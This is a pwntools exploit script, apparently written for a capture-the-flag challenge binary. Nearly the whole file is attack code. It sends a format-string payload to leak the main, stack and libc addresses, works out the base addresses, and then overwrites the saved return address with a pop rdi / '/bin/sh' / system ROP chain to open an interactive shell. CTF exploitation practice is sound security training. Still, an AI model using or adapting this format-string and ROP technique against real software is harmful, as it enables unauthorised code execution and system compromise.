#!/usr/bin/env python3

from pwn import *

elf = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = elf


def conn():
    if args.LOCAL:
        r = process([elf.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        # r = remote("playground.tcp1p.team",4156)
        r = remote("127.0.0.1",1470)

    return r


def main():
    p = conn()
    # p = remote("127.0.0.1",1470)
    # p = remote("playground.tcp1p.team",4156)
    # context.terminal = ['wt.exe','wsl.exe'] 
    # context.log_level = 'debug'
    # Send format string payload
    p.sendline(b"OMO%77$pOMO%82$pOMO%1$p")
    # print(len(b"OMO%77$pOMO%46$p"))
    p.recvuntil(b"OMO")  # Synchronize output

    # Receive the leak and split it
    leaks = p.recvline().strip().split(b"OMO")
    leak_main = int(leaks[0], 16)  # 77th format string leak (main)
    leak_stack = int(leaks[1], 16)  # 3th format string leak (stack)
    leak_libc = int(leaks[2], 16)  # 1th format string leak (stack)
    elf.address = leak_main - elf.sym['main']
    # Print the leaks for debugging
    base_stack = leak_stack - 0x20c98
    rip_stack = base_stack + 0x20b78
    base_libc = leak_libc - 0x21ab23
    libc.address = base_libc
    offset_fmstr = 6
    log.info(f"Leaked main: {hex(leak_main)}")
    log.info(f"Leaked stack: {hex(leak_stack)}")
    log.info(f"BASE : {hex(elf.address)}")
    log.info(f"BASE STACK : {hex(base_stack)}")
    log.info(f"BASE LIBC : {hex(base_libc)}")
    log.info(f"rip: {hex(rip_stack)}")
    log.info(f"win: {hex(elf.sym['win'])}")
    rop = ROP(libc)
    ret = rop.find_gadget(['ret'])[0]
    system = libc.sym['system']
    rdi = rop.find_gadget(['pop rdi','ret'])[0]
    bin_sh = next(libc.search(b'/bin/sh\x00'))
    win = elf.sym['win']
    payload = fmtstr_payload(6,{rip_stack: rdi,rip_stack + 8: bin_sh,rip_stack + 16: ret,rip_stack + 24: system})
    log.info(f"len {len(payload)}")
    log.info(f"payload : {payload}")
    time.sleep(50)
    p.sendline(payload)

    # gdb.attach(p, '''
    #         break perfect
    #         ''')  # Use tmux
    write("payload",payload)
    # print(p.recv(9999))
    # print(p.recv(9999))
    # good luck pwning :)

    p.interactive()


if __name__ == "__main__":
    main()
